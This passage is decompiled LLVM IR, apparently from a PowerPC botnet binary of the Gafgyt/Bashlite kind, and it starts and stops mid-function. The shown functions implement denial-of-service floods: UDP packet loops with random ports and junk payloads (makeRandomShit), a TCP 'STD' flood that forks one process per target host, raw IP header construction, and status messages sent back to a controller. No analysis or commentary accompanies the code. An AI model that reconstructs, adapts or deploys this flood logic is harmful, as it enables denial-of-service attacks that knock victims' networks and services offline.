  %storemerge3 = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1002b294.371, i32 0, i32 0), %dec_label_pc_10009008 ], [ %v5_1000902c, %dec_label_pc_10009020 ]
  %stack_var_-68.0 = phi i32 [ 1, %dec_label_pc_10009008 ], [ 0, %dec_label_pc_10009020 ]
  store i32 268472376, i32* @lr, align 4
  %v1_10009034 = call i32 @__GI_time(i32 0)
  store i32 268472388, i32* @lr, align 4
  %v1_10009040 = call i32 @srand(i32 %v1_10009034)
  %v1_10009048 = add i32 %arg4, 16
  %v1_1000904c = inttoptr i32 %v1_10009048 to i32*
  %v2_1000904c = load i32, i32* %v1_1000904c, align 4
  store i32 268472408, i32* @lr, align 4
  %v1_10009054 = call i32 @atol(i32 %v2_1000904c)
  %v2_10009060 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_10009060, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 268472436, i32* @lr, align 4
  %v0_10009070 = call i32 @__GI_memset()
  %v1_10009078 = add i32 %arg4, 4
  %v1_1000907c = inttoptr i32 %v1_10009078 to i32*
  %v2_1000907c = load i32, i32* %v1_1000907c, align 4
  store i32 268472460, i32* @lr, align 4
  %v3_10009088 = call i32 @host2ip(i32 %arg2, i32 %v2_1000907c, i32 %v1_10009078)
  store i32 2, i32* %stack_var_-44, align 4
  %v3_100090a0 = icmp eq i32 %stack_var_-64.0, 0
  br i1 %v3_100090a0, label %dec_label_pc_100090a8, label %dec_label_pc_100090e4

dec_label_pc_100090a8:                            ; preds = %dec_label_pc_10009030
  %v2_100090b0 = load i32, i32* %v1_10008fb8, align 4
  store i32 268472508, i32* @lr, align 4
  %v1_100090b8 = call i32 @atol(i32 %v2_100090b0)
  %v1_100090c0 = urem i32 %v1_100090b8, 65536
  store i32 %v1_100090c0, i32* @r3, align 4
  %v1_100090c8 = call i32 @htons(i32 %v1_100090c0)
  %v2_100090dc = load i32, i32* %v1_10008fe8, align 4
  %v5_100090e0 = inttoptr i32 %v2_100090dc to i8*
  br label %dec_label_pc_100090e4

dec_label_pc_100090e4:                            ; preds = %dec_label_pc_10009030, %dec_label_pc_100090a8
  %stack_var_-84.0 = phi i8* [ %v5_100090e0, %dec_label_pc_100090a8 ], [ %storemerge3, %dec_label_pc_10009030 ]
  %v2_100090ec = load i32, i32* %v1_1000907c, align 4
  %v4_10009114 = ptrtoint i8* %stack_var_-84.0 to i32
  store i32 %v4_10009114, i32* @r8, align 4
  %v8_1000911c = call i32 @Send(i32 %arg1, i32 ptrtoint ([49 x i8]* @global_var_1002b29c.372 to i32), i32 %arg2, i32 %v2_100090ec)
  %v3_10009124 = icmp eq i32 %stack_var_-64.0, 1
  %v3_10009158 = icmp eq i32 %stack_var_-68.0, 1
  %v2_10009224 = add i32 %v1_10009054, %v1_10008f44
  br label %dec_label_pc_10009120

dec_label_pc_10009120:                            ; preds = %dec_label_pc_10009238, %dec_label_pc_100090e4
  %stack_var_-52.0 = phi i32 [ %tmp, %dec_label_pc_100090e4 ], [ %v1_1000923c, %dec_label_pc_10009238 ]
  br i1 %v3_10009124, label %dec_label_pc_1000912c, label %dec_label_pc_10009154

dec_label_pc_1000912c:                            ; preds = %dec_label_pc_10009120
  store i32 268472636, i32* @lr, align 4
  %v2_10009138 = call i32 @realrand(i32 1026, i32 65535)
  %v1_10009140 = urem i32 %v2_10009138, 65536
  store i32 %v1_10009140, i32* @r3, align 4
  %v1_10009148 = call i32 @htons(i32 %v1_10009140)
  br label %dec_label_pc_10009154

dec_label_pc_10009154:                            ; preds = %dec_label_pc_10009120, %dec_label_pc_1000912c
  br i1 %v3_10009158, label %dec_label_pc_10009160, label %dec_label_pc_10009180

dec_label_pc_10009160:                            ; preds = %dec_label_pc_10009154
  store i32 268472684, i32* @lr, align 4
  %v2_10009168 = call i32 @realrand(i32 64, i32 1024)
  store i32 ptrtoint (i32* @global_var_1000917c.373 to i32), i32* @lr, align 4
  %v2_10009178 = call i32 @makeRandomShit(i32 %v0_10008f94, i32 %v2_10009168)
  br label %dec_label_pc_100091a4

dec_label_pc_10009180:                            ; preds = %dec_label_pc_10009154
  %v2_10009188 = load i32, i32* %v1_10008fe8, align 4
  store i32 268472724, i32* @lr, align 4
  %v1_10009190 = call i32 @atol(i32 %v2_10009188)
  store i32 ptrtoint ([3 x i8]* @global_var_100091a4.374 to i32), i32* @lr, align 4
  %v2_100091a0 = call i32 @makeRandomShit(i32 %v0_10008f94, i32 %v1_10009190)
  br label %dec_label_pc_100091a4

dec_label_pc_100091a4:                            ; preds = %dec_label_pc_10009160, %dec_label_pc_10009180
  store i32 268472756, i32* @lr, align 4
  %v3_100091b0 = call i32 @socket(i32 2, i32 2, i32 17)
  %v1_100091c0 = icmp slt i32 %v3_100091b0, 0
  br i1 %v1_100091c0, label %dec_label_pc_10009200, label %dec_label_pc_100091c8

dec_label_pc_100091c8:                            ; preds = %dec_label_pc_100091a4
  store i32 %v0_10008f94, i32* @r3, align 4
  %v0_100091d0 = call i32 @__GI_strlen()
  store i32 268472824, i32* @lr, align 4
  %v6_100091f4 = call i32 @sendto(i32 %v3_100091b0, i32 %v0_10008f94, i32 %v0_100091d0, i32 0, i32 %v2_10009060, i32 16)
  store i32 268472832, i32* @lr, align 4
  %v1_100091fc = call i32 @close(i32 %v3_100091b0)
  br label %dec_label_pc_10009200

dec_label_pc_10009200:                            ; preds = %dec_label_pc_100091a4, %dec_label_pc_100091c8
  %tmp23 = icmp slt i32 %stack_var_-52.0, 100
  br i1 %tmp23, label %dec_label_pc_10009238, label %dec_label_pc_1000920c

dec_label_pc_1000920c:                            ; preds = %dec_label_pc_10009200
  store i32 268472852, i32* @lr, align 4
  %v1_10009210 = call i32 @__GI_time(i32 0)
  %v2_10009228 = icmp ult i32 %v1_10009210, %v2_10009224
  br i1 %v2_10009228, label %dec_label_pc_10009230, label %dec_label_pc_10009248

dec_label_pc_10009230:                            ; preds = %dec_label_pc_1000920c
  br label %dec_label_pc_10009238

dec_label_pc_10009238:                            ; preds = %dec_label_pc_10009200, %dec_label_pc_10009230
  %stack_var_-52.1 = phi i32 [ %stack_var_-52.0, %dec_label_pc_10009200 ], [ 0, %dec_label_pc_10009230 ]
  %v1_1000923c = add i32 %stack_var_-52.1, 1
  br label %dec_label_pc_10009120

dec_label_pc_10009248:                            ; preds = %dec_label_pc_1000920c
  store i32 ptrtoint ([3 x i8]* @global_var_10009250.375 to i32), i32* @lr, align 4
  %v1_1000924c = call i32 @close(i32 %v3_100091b0)
  %v0_10009254 = call i32 @__GI_exit()
  br label %dec_label_pc_10009258

dec_label_pc_10009258:                            ; preds = %dec_label_pc_10008f7c, %dec_label_pc_10009248
  %v0_1000926c = phi i32 [ %v1_10008f80, %dec_label_pc_10008f7c ], [ %v0_10009254, %dec_label_pc_10009248 ]
  ret i32 %v0_1000926c

; uselistorder directives
  uselistorder i32 %v1_10009140, { 1, 0 }
  uselistorder i32 %v1_100090c0, { 1, 0 }
  uselistorder i32* %v1_10008fe8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10008f94, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @host2ip, { 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002b290.370 to i32), { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10009258, { 1, 0 }
  uselistorder label %dec_label_pc_10009238, { 1, 0 }
  uselistorder label %dec_label_pc_10009200, { 1, 0 }
  uselistorder label %dec_label_pc_100091a4, { 1, 0 }
  uselistorder label %dec_label_pc_10009154, { 1, 0 }
  uselistorder label %dec_label_pc_100090e4, { 1, 0 }
  uselistorder label %dec_label_pc_10009030, { 1, 0 }
  uselistorder label %dec_label_pc_10008fe0, { 1, 0 }
  uselistorder label %dec_label_pc_10008f7c, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  store i32 268472968, i32* @lr, align 4
  %v0_10009284 = call i32 @fork()
  %v3_10009294 = icmp eq i32 %v0_10009284, 0
  br i1 %v3_10009294, label %dec_label_pc_10009388, label %dec_label_pc_100092a8

dec_label_pc_100092a8:                            ; preds = %entry
  %v3_100092ac = load i32, i32* @global_var_1004515c.26, align 4
  %v1_100092b0 = add i32 %v3_100092ac, 1
  store i32 %v1_100092b0, i32* @global_var_1004515c.26, align 4
  %v1_100092c4 = mul i32 %v1_100092b0, 4
  %v1_100092c8 = add i32 %v1_100092c4, 4
  store i32 %v1_100092c8, i32* @r3, align 4
  store i32 268473044, i32* @lr, align 4
  %v0_100092d0 = call i32 @malloc()
  %v3_1000932c4 = load i32, i32* @global_var_1004515c.26, align 4
  %v3_100093386 = icmp eq i32 %v3_1000932c4, 1
  br i1 %v3_100093386, label %dec_label_pc_10009340, label %dec_label_pc_100092e8

dec_label_pc_100092e8:                            ; preds = %dec_label_pc_100092a8, %dec_label_pc_100092e8
  %storemerge28 = phi i32 [ %v1_10009320, %dec_label_pc_100092e8 ], [ 0, %dec_label_pc_100092a8 ]
  %v1_100092ec = mul i32 %storemerge28, 4
  %v2_100092f8 = add i32 %v1_100092ec, %v0_100092d0
  store i32 %v2_100092f8, i32* @r10, align 4
  %v3_1000930c = load i32, i32* @global_var_100451ac.27, align 4
  %v2_10009310 = add i32 %v3_1000930c, %v1_100092ec
  %v1_10009314 = inttoptr i32 %v2_10009310 to i32*
  %v2_10009314 = load i32, i32* %v1_10009314, align 4
  %v2_10009318 = inttoptr i32 %v2_100092f8 to i32*
  store i32 %v2_10009314, i32* %v2_10009318, align 4
  %v1_10009320 = add i32 %storemerge28, 1
  %v3_1000932c = load i32, i32* @global_var_1004515c.26, align 4
  %v1_10009330 = add i32 %v3_1000932c, -1
  %v3_10009338 = icmp ugt i32 %v1_10009330, %v1_10009320
  br i1 %v3_10009338, label %dec_label_pc_100092e8, label %dec_label_pc_10009328.dec_label_pc_10009340_crit_edge

dec_label_pc_10009328.dec_label_pc_10009340_crit_edge: ; preds = %dec_label_pc_100092e8
  br label %dec_label_pc_10009340

dec_label_pc_10009340:                            ; preds = %dec_label_pc_100092a8, %dec_label_pc_10009328.dec_label_pc_10009340_crit_edge
  %v3_10009344 = phi i32 [ %v3_1000932c, %dec_label_pc_10009328.dec_label_pc_10009340_crit_edge ], [ %v3_1000932c4, %dec_label_pc_100092a8 ]
  %v1_10009348 = mul i32 %v3_10009344, 4
  %v2_10009354 = add i32 %v0_100092d0, -4
  %v1_10009358 = add i32 %v2_10009354, %v1_10009348
  %v2_10009360 = inttoptr i32 %v1_10009358 to i32*
  store i32 %v0_10009284, i32* %v2_10009360, align 4
  %v3_10009368 = load i32, i32* @global_var_100451ac.27, align 4
  store i32 %v3_10009368, i32* @r3, align 4
  store i32 268473204, i32* @lr, align 4
  %v0_10009370 = call i32 @free()
  store i32 %v0_100092d0, i32* @global_var_100451ac.27, align 4
  br label %dec_label_pc_10009388

dec_label_pc_10009388:                            ; preds = %entry, %dec_label_pc_10009340
  ret i32 %v0_10009284

; uselistorder directives
  uselistorder i32 %v1_10009320, { 1, 0 }
  uselistorder i32 %v1_100092ec, { 1, 0 }
  uselistorder i32 %storemerge28, { 1, 0 }
  uselistorder i32 %v3_1000932c4, { 1, 0 }
  uselistorder i32 %v0_100092d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10009388, { 1, 0 }
  uselistorder label %dec_label_pc_10009340, { 1, 0 }
  uselistorder label %dec_label_pc_100092e8, { 1, 0 }
}

define i32 @SendTheSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-392 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  store i32 268473304, i32* @lr, align 4
  %v3_100093d4 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268473320, i32* @lr, align 4
  %v1_100093e4 = call i32 @__GI_time(i32 0)
  store i32 268473340, i32* @lr, align 4
  %v1_100093f8 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_10009404 = ptrtoint i32* %stack_var_-368 to i32
  store i32 0, i32* %stack_var_-368, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v1_1000942c = add i32 %v1_100093f8, 16
  %v2_1000942c = inttoptr i32 %v1_1000942c to i32*
  %v3_1000942c = load i32, i32* %v2_1000942c, align 4
  %v1_10009430 = inttoptr i32 %v3_1000942c to i32*
  %v2_10009430 = load i32, i32* %v1_10009430, align 4
  %v2_10009438 = ptrtoint i32* %stack_var_-364 to i32
  %v1_10009440 = add i32 %v1_100093f8, 12
  %v2_10009440 = inttoptr i32 %v1_10009440 to i32*
  %v3_10009440 = load i32, i32* %v2_10009440, align 4
  store i32 %v3_10009440, i32* @r5, align 4
  store i32 268473428, i32* @lr, align 4
  %v4_10009450 = call i32 @bcopy(i32 %v2_10009430, i32 %v2_10009438, i32 %v3_10009440, i32 %v1_100093f8)
  %v1_10009458 = add i32 %v1_100093f8, 8
  %v2_10009458 = inttoptr i32 %v1_10009458 to i32*
  %v3_10009458 = load i32, i32* %v2_10009458, align 4
  %v1_1000945c = urem i32 %v3_10009458, 65536
  store i32 %v1_1000945c, i32* %stack_var_-368, align 4
  %v2_10009480 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_10009480, i32* @r3, align 4
  store i32 ptrtoint ([79 x i8*]* @global_var_1002b868.455 to i32), i32* @r4, align 4
  store i32 316, i32* @r5, align 4
  store i32 268473496, i32* @lr, align 4
  %v0_10009494 = call i32 @memcpy()
  %v3_1000949c = icmp eq i32 %arg2, 0
  %v2_10009500 = ptrtoint i32* %stack_var_-392 to i32
  %v2_10009504 = add i32 %v2_10009500, 40
  %v2_10009574 = add i32 %v1_100093e4, %arg3
  br label %dec_label_pc_10009498

dec_label_pc_10009498:                            ; preds = %dec_label_pc_10009598, %entry
  %stack_var_-388.0 = phi i32 [ 0, %entry ], [ %v1_1000959c, %dec_label_pc_10009598 ]
  br i1 %v3_1000949c, label %dec_label_pc_100094a4, label %dec_label_pc_100094c8

dec_label_pc_100094a4:                            ; preds = %dec_label_pc_10009498
  store i32 268473524, i32* @lr, align 4
  %v2_100094b0 = call i32 @realrand(i32 1, i32 65535)
  br label %dec_label_pc_100094c8

dec_label_pc_100094c8:                            ; preds = %dec_label_pc_10009498, %dec_label_pc_100094a4
  %storemerge4 = phi i32 [ %v2_100094b0, %dec_label_pc_100094a4 ], [ %arg2, %dec_label_pc_10009498 ]
  store i32 %storemerge4, i32* %stack_var_-392, align 4
  store i32 268473548, i32* @lr, align 4
  %v0_100094c8 = call i32 @random()
  %v1_100094e0 = urem i32 %v0_100094c8, 79
  %v1_100094fc = mul nuw nsw i32 %v1_100094e0, 4
  %v1_10009508 = add i32 %v2_10009504, %v1_100094fc
  %v1_1000950c = inttoptr i32 %v1_10009508 to i32*
  %v2_1000950c = load i32, i32* %v1_1000950c, align 4
  store i32 268473652, i32* @lr, align 4
  %v3_10009530 = call i32 @connect(i32 %v3_100093d4, i32 %v2_10009404, i32 16)
  store i32 %v2_1000950c, i32* @r3, align 4
  %v0_10009538 = call i32 @__GI_strlen()
  store i32 268473684, i32* @lr, align 4
  %v5_10009550 = call i32 @send(i32 %v3_100093d4, i32 %v2_1000950c, i32 %v0_10009538, i32 0)
  %tmp25 = icmp ult i32 %stack_var_-388.0, 100
  br i1 %tmp25, label %dec_label_pc_10009598, label %dec_label_pc_10009560

dec_label_pc_10009560:                            ; preds = %dec_label_pc_100094c8
  store i32 268473704, i32* @lr, align 4
  %v1_10009564 = call i32 @__GI_time(i32 0)
  %v2_10009578 = icmp slt i32 %v1_10009564, %v2_10009574
  br i1 %v2_10009578, label %dec_label_pc_10009590, label %dec_label_pc_10009580

dec_label_pc_10009580:                            ; preds = %dec_label_pc_10009560
  store i32 ptrtoint ([3 x i8]* @global_var_10009588.456 to i32), i32* @lr, align 4
  %v1_10009584 = call i32 @close(i32 %v3_100093d4)
  %v1_1000958c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10009590

dec_label_pc_10009590:                            ; preds = %dec_label_pc_10009560, %dec_label_pc_10009580
  br label %dec_label_pc_10009598

dec_label_pc_10009598:                            ; preds = %dec_label_pc_100094c8, %dec_label_pc_10009590
  %stack_var_-388.1 = phi i32 [ %stack_var_-388.0, %dec_label_pc_100094c8 ], [ 0, %dec_label_pc_10009590 ]
  %v1_1000959c = add i32 %stack_var_-388.1, 1
  br label %dec_label_pc_10009498

; uselistorder directives
  uselistorder i32 %v3_10009440, { 1, 0 }
  uselistorder i32 %v1_100093f8, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-364, { 1, 0 }
  uselistorder label %dec_label_pc_10009598, { 1, 0 }
  uselistorder label %dec_label_pc_10009590, { 1, 0 }
  uselistorder label %dec_label_pc_100094c8, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_100095d0 = call i32 @mfork(i32 %arg2)
  %v3_100095d8 = icmp eq i32 %v1_100095d0, 0
  br i1 %v3_100095d8, label %dec_label_pc_100095e0, label %dec_label_pc_10009774

dec_label_pc_100095e0:                            ; preds = %entry
  %v2_100095e4 = icmp sgt i32 %arg3, 2
  br i1 %v2_100095e4, label %dec_label_pc_1000960c, label %dec_label_pc_100095ec

dec_label_pc_100095ec:                            ; preds = %dec_label_pc_100095e0
  %v6_10009600 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1002b9ac.458 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_10009608 = call i32 @__GI_exit()
  br label %dec_label_pc_1000960c

dec_label_pc_1000960c:                            ; preds = %dec_label_pc_100095e0, %dec_label_pc_100095ec
  %v1_10009610 = add i32 %arg4, 4
  %v1_10009614 = inttoptr i32 %v1_10009610 to i32*
  %v2_10009614 = load i32, i32* %v1_10009614, align 4
  %v1_10009620 = add i32 %arg4, 8
  %v1_10009624 = inttoptr i32 %v1_10009620 to i32*
  %v2_10009624 = load i32, i32* %v1_10009624, align 4
  store i32 268473904, i32* @lr, align 4
  %v1_1000962c = call i32 @atol(i32 %v2_10009624)
  %v1_1000963c = add i32 %arg4, 12
  %v1_10009640 = inttoptr i32 %v1_1000963c to i32*
  %v2_10009640 = load i32, i32* %v1_10009640, align 4
  store i32 268473932, i32* @lr, align 4
  %v1_10009648 = call i32 @atol(i32 %v2_10009640)
  store i32 %v2_10009614, i32* @r3, align 4
  store i32 268473956, i32* @lr, align 4
  %v2_10009660 = call i32 @__GI_strchr(i32 %v2_10009614, i32 44)
  %v3_10009668 = icmp eq i32 %v2_10009660, 0
  br i1 %v3_10009668, label %dec_label_pc_1000970c, label %dec_label_pc_10009670

dec_label_pc_10009670:                            ; preds = %dec_label_pc_1000960c
  store i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32* @r4, align 4
  store i32 268473988, i32* @lr, align 4
  %v4_10009680 = call i32 @__GI_strtok(i32 %v2_10009614, i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_100097005 = icmp eq i32 %v4_10009680, 0
  br i1 %v3_100097005, label %dec_label_pc_10009774, label %dec_label_pc_10009690

dec_label_pc_10009690:                            ; preds = %dec_label_pc_10009670, %dec_label_pc_100096e4
  %storemerge26 = phi i32 [ %v4_100096f0, %dec_label_pc_100096e4 ], [ %v4_10009680, %dec_label_pc_10009670 ]
  store i32 268474004, i32* @lr, align 4
  %v0_10009690 = call i32 @listFork()
  %v3_10009698 = icmp eq i32 %v0_10009690, 0
  br i1 %v3_10009698, label %dec_label_pc_100096a0, label %dec_label_pc_100096e4

dec_label_pc_100096a0:                            ; preds = %dec_label_pc_10009690
  %v7_100096c8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002b9d0.460 to i32), i32 %arg2, i32 %storemerge26)
  %v3_100096d8 = call i32 @SendTheSTD(i32 %storemerge26, i32 %v1_1000962c, i32 %v1_10009648)
  %v1_100096e0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100096e4

dec_label_pc_100096e4:                            ; preds = %dec_label_pc_10009690, %dec_label_pc_100096a0
  store i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32* @r4, align 4
  store i32 268474100, i32* @lr, align 4
  %v4_100096f0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_10009700 = icmp eq i32 %v4_100096f0, 0
  br i1 %v3_10009700, label %dec_label_pc_10009774, label %dec_label_pc_10009690

dec_label_pc_1000970c:                            ; preds = %dec_label_pc_1000960c
  store i32 268474128, i32* @lr, align 4
  %v0_1000970c = call i32 @listFork()
  %v3_10009714 = icmp eq i32 %v0_1000970c, 0
  br i1 %v3_10009714, label %dec_label_pc_10009724, label %dec_label_pc_1000971c

dec_label_pc_1000971c:                            ; preds = %dec_label_pc_1000970c
  %v0_10009720 = call i32 @__GI_exit()
  br label %dec_label_pc_10009724

dec_label_pc_10009724:                            ; preds = %dec_label_pc_1000970c, %dec_label_pc_1000971c
  %v2_1000972c = load i32, i32* %v1_10009614, align 4
  %v7_10009758 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002b9d0.460 to i32), i32 %arg2, i32 %v2_1000972c)
  %v3_10009768 = call i32 @SendTheSTD(i32 %v2_10009614, i32 %v1_1000962c, i32 %v1_10009648)
  %v1_10009770 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10009774

dec_label_pc_10009774:                            ; preds = %dec_label_pc_100096e4, %dec_label_pc_10009670, %entry, %dec_label_pc_10009724
  %v0_10009788 = phi i32 [ %v1_100095d0, %entry ], [ %v1_10009770, %dec_label_pc_10009724 ], [ 0, %dec_label_pc_10009670 ], [ 0, %dec_label_pc_100096e4 ]
  ret i32 %v0_10009788

; uselistorder directives
  uselistorder i32 %v4_100096f0, { 1, 0 }
  uselistorder i32 %storemerge26, { 1, 0 }
  uselistorder i32 %v1_10009648, { 1, 0 }
  uselistorder i32 %v1_1000962c, { 1, 0 }
  uselistorder i32 %v2_10009614, { 1, 0, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @SendTheSTD, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009774, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009724, { 1, 0 }
  uselistorder label %dec_label_pc_100096e4, { 1, 0 }
  uselistorder label %dec_label_pc_10009690, { 1, 0 }
  uselistorder label %dec_label_pc_1000960c, { 1, 0 }
}

define i32 @get_iface_ip(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  store i32 268474296, i32* @lr, align 4
  %v3_100097b4 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_100097c8 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %arg2, i32* @r4, align 4
  store i32 268474332, i32* @lr, align 4
  %v3_100097d8 = call i32 @strncpy(i32 %v2_100097c8, i32 %arg2, i32 15)
  store i32 %v3_100097b4, i32* @r3, align 4
  store i32 35093, i32* @r4, align 4
  store i32 %v2_100097c8, i32* @r5, align 4
  store i32 268474360, i32* @lr, align 4
  %v0_100097f4 = call i32 @ioctl()
  %v3_10009804 = icmp eq i32 %v0_100097f4, 0
  br i1 %v3_10009804, label %dec_label_pc_10009818, label %dec_label_pc_10009848

dec_label_pc_10009818:                            ; preds = %entry
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 268474400, i32* @lr, align 4
  %v1_1000981c = call i32 @close(i32 %v3_100097b4)
  store i16 2, i16* %arg1, align 2
  %v2_1000983c = add i32 %tmp, 4
  %v3_1000983c = inttoptr i32 %v2_1000983c to i32*
  br label %dec_label_pc_10009848

dec_label_pc_10009848:                            ; preds = %entry, %dec_label_pc_10009818
  %storemerge = phi i32 [ 1, %dec_label_pc_10009818 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_10009848, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268474512, i32* @lr, align 4
  %v1_1000988c = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_1000988c, i32* %arg2, align 4
  %v4_100098a8 = icmp eq i32 %v1_1000988c, -1
  %. = zext i1 %v4_100098a8 to i32
  ret i32 %.
}

define i32 @makeIPPacket(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_1000991c = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_1000991c, i32* %arg1, align 4
  %v1_10009930 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10009930, i32* %arg1, align 4
  %v3_10009940 = add i32 %tmp1, 1
  %v4_10009940 = inttoptr i32 %v3_10009940 to i8*
  store i8 0, i8* %v4_10009940, align 1
  %fold = add i32 %arg5, 20
  %v1_10009958 = trunc i32 %fold to i16
  %v3_10009958 = add i32 %tmp1, 2
  %v4_10009958 = inttoptr i32 %v3_10009958 to i16*
  store i16 %v1_10009958, i16* %v4_10009958, align 2
  %v0_1000995c = call i32 @rand_cmwc()
  %v1_1000996c = trunc i32 %v0_1000995c to i16
  %v3_1000996c = add i32 %tmp1, 4
  %v4_1000996c = inttoptr i32 %v3_1000996c to i16*
  store i16 %v1_1000996c, i16* %v4_1000996c, align 2
  %v3_10009978 = add i32 %tmp1, 6
  %v4_10009978 = inttoptr i32 %v3_10009978 to i16*
  store i16 0, i16* %v4_10009978, align 2
  %v3_10009984 = add i32 %tmp1, 8
  %v4_10009984 = inttoptr i32 %v3_10009984 to i8*
  store i8 -1, i8* %v4_10009984, align 1
  %v3_10009990 = add i32 %tmp1, 9
  %v4_10009990 = inttoptr i32 %v3_10009990 to i8*
  store i8 %tmp, i8* %v4_10009990, align 1
  %v3_1000999c = add i32 %tmp1, 10
  %v4_1000999c = inttoptr i32 %v3_1000999c to i16*
  store i16 0, i16* %v4_1000999c, align 2
  %v2_100099a8 = add i32 %tmp1, 12
  %v3_100099a8 = inttoptr i32 %v2_100099a8 to i32*
  store i32 %arg3, i32* %v3_100099a8, align 4
  %v2_100099b4 = add i32 %tmp1, 16
  %v3_100099b4 = inttoptr i32 %v2_100099b4 to i32*
  store i32 %arg2, i32* %v3_100099b4, align 4
  ret i32 %v0_1000995c
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_100099e4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-20, align 4
  %v3_100099f0 = icmp eq i32 %v0_100099e4, 0
  br i1 %v3_100099f0, label %dec_label_pc_10009a24, label %dec_label_pc_100099f8

dec_label_pc_100099f8:                            ; preds = %entry
  %v1_100099fc = inttoptr i32 %v0_100099e4 to i32*
  %v2_100099fc = load i32, i32* %v1_100099fc, align 4
  %v1_10009a08 = trunc i32 %arg2 to i8
  %v3_10009a08 = inttoptr i32 %v2_100099fc to i8*
  store i8 %v1_10009a08, i8* %v3_10009a08, align 1
  %v2_10009a10 = load i32, i32* %v1_100099fc, align 4
  %v1_10009a14 = add i32 %v2_10009a10, 1
  store i32 %v1_10009a14, i32* %v1_100099fc, align 4
  %v0_10009a4c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009a38

dec_label_pc_10009a24:                            ; preds = %entry
  %v2_10009a24 = ptrtoint i32* %stack_var_-20 to i32
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268474936, i32* @lr, align 4
  %v3_10009a34 = call i32 @write(i32 1, i32 %v2_10009a24, i32 1)
  store i32 %v3_10009a34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009a38

dec_label_pc_10009a38:                            ; preds = %dec_label_pc_100099f8, %dec_label_pc_10009a24
  %v0_10009a4c = phi i32 [ %v0_10009a4c.pre, %dec_label_pc_100099f8 ], [ %v3_10009a34, %dec_label_pc_10009a24 ]
  ret i32 %v0_10009a4c

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 1, 0, 2 }
  uselistorder label %dec_label_pc_10009a38, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp44 = icmp slt i32 %arg3, 1
  br i1 %tmp44, label %dec_label_pc_10009b14, label %dec_label_pc_10009a90

dec_label_pc_10009a90:                            ; preds = %entry
  %v2_10009ac025 = load i8, i8* %arg2, align 1
  %v3_10009ac828 = icmp eq i8 %v2_10009ac025, 0
  br i1 %v3_10009ac828, label %dec_label_pc_10009ad0, label %dec_label_pc_10009aa4

dec_label_pc_10009aa4:                            ; preds = %dec_label_pc_10009a90, %dec_label_pc_10009aa4
